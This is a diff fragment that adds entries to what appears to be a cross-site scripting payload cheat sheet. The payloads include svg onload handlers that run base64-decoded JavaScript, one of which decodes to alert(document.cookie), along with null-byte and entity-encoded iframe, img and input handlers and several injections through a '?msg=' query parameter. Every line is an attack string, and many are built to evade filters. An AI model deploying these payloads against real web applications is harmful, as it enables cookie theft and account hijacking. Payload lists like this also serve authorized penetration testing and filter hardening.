@@ -68,6 +68,22 @@ tes/><iframe src-javascript:prompt(document.cookie)>
 }}})</script><script>alert(1)</script>
 
 <a/+/OnMoUsEOVEr+=+(confirm)(document.domain)>
+
+<svg/onload=eval(atob(‘YWxlcnQoZG9jdW1lbnQuY29va2llKQ==’))>
+
+<svg/onload=eval(atob(‘YWxlcnQoJ1hTUycp’))>
+
+<svg><script%20?>confirm(1)
+
+?msg=<img/src=`%00`%20onerror=this.onerror=confirm(1)
+
+?msg=<script>alert(1)</script>
+?msg=<img src=xss onerror=alert(1)>
+?msg=<input/onmouseover=”javaSCRIPT&colon;confirm&lpar;1&rpar;”
+?msg=<iframe %00 src=”&Tab;javascript:prompt(1)&Tab;”%00>
+?msg=<h1>Hello World</h1>
+
+
 ```
 
 svg file upload
